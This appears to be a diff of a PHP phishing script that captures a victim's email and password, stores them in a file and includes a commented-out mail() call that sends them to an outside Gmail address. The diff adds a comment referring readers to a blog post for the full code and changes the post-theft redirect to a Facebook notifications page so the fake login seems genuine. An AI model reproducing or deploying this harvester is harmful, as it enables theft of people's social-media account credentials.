@@ -11,6 +11,7 @@ $message= $email."\n".$password."\n";    // append them and assign it to a varia
 
 /* php code for send an email which contains credentials.
 mail('xxxxxxxxx@gmail.com', 'My Subject', $message);
+full php code for this is on my blog post.please refer.
  */
 
 
@@ -29,6 +30,6 @@ fwrite ($myfile,"$section");
 fclose($myfile);
 
 //finally redirecting the user to the page/group or somewhere else
-header("location:https://www.facebook.com/FB-Jokes-Network-Sri-Lanka-431309230269057/");
+header("location:https://www.facebook.com/notifications");
 
 ?>
